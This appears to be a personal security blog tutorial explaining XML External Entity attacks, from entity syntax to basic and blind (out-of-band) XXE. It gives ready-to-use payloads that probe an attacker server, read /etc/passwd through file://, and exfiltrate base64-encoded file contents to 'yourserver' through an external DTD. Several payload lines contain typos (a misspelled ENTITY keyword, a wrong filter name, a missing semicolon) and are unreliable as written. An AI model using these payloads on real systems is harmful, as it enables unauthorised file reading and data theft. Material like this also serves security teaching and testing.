Hi all,

&nbsp;  Welcome to my blog of "From basic XXE to blind XXE"<br><br>

But first let's understand some basic keywords.

**Entity**: Entities reference data that act as an abbreviation or can be found at an external location. 

Most common entites are:-

**Internal Entity**: If an entity is declared within a DTD it is called as internal entity.<br>
*Syntax:-* `<!ENTITY entity_name "entity_value">`

**External Entity**: If an entity is declared outside a DTD it is called as external entity. Identified by 'SYSTEM'.<br>
*Syntax:-* `<!ENTITY entity_name SYSTEM "entity_value">`

**Parameter Entity**: The purpose of a parameter entity is to enable you to create reusable sections of replacement text. (If not understood, You will understand more clearly in later.)<br>
*Syntax:-* `<!ENTITY % entity "another entity (Internal or External)">`


## What is XXE?

XXE is a short of XML External Entity, which is a vulnerablity found when misconfiguration XML parser parses enternal entities.
There are two types of XXE:- 

1. Basic.
2. Blind.

Basic one:-

For ex you have a url with a parameter that parses XML data somthing like this:- 'http://myapp.com/somefile.php?xml=<xml_data>'

Now when you provide any xml data, and that data is printing back to the user's browser then you can try basic XXE. You have to confirm the vulnerability existence and this can be done by something like this.

Payload:- `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'http://yourserverip/'>]><root>&test;</root>`

Now let's understand this. 

1.First we declare the xml Syntax, now, we define DOCTYPE to define the contents of XML body,<br> 
2.After that, we define root element after the DOCTYPE i.e. root, next, we define the Entity and that entity contains SYSTEM attribute which indicate that the entity is External.<br>
3.After that we define our server's ip because we want to let the target server to send the request to us.

Now when you give that payload to mis-configured XML parser, the mis-configured XML parser will parse the results and it will process our External entity by **requesting to your server.**

So if you got a new connection in the log file then it is confirmed that you have found XXE.

### Now it's time to exploit it.

Our main target is to read local files of the web server and this can be done using this payload 

`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>`,

The xml parser will process this payload as same as above but instead of requesting to your server now it will request to locally, with the file protocol, it will grep the file contents and shown to us. Hence, we can read local file of the webserver.

## What if the xml data is not showing to us? (Blind XXE Case)

Okay,

Still you can confirm the existence of the vulnerability by using the first payload above. But you can't see the file contents of local files of webserver. This is still an issue but now the severity is a ***little bit low.*** And, this is called Blind XXE OR Out-of-band XXE.

So we also needed to blind means we have to use blind payload.

`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % test SYSTEM 'http://yourserver/xml.dtd'> %test; %exe]><root>&entity;</root>`

Your xml.dtd contents:- 

`<!ENTITY % file SYSTEM "php://filter/convert/base64.encode/resource=/etc/passwd">`
`<!ENTIY % exe "<!ENTITY entity SYSTEM 'http://yourserver/%file;'>">`

Lot's of code to understand:-

> we are using External dtd file i.e. `%test;`. So first the xml parser will parse this entity and make a request to your web-server for getting the contents of dtd file. Now, in that dtd file we define some entities to process. 
>
> `%exe;` will make another general entity i.e. &entity; and that entity will make a request to our server with the *file contents.* which was found by the `%file;`
>
> When the xml parser parses the entity `%file;`, then that entity will grep the file contents of local files of the server (which is our main target). 
> We are using php filter to get the file contents to bypass any restrictions.
> Now attacker can log the request and reconstruct the file contents. 

Make sense?

Let's see the demo below.

<video src="bandicam 2018-11-04 23-35-26-024.mp4" width="320" height="200" controls preload></video>


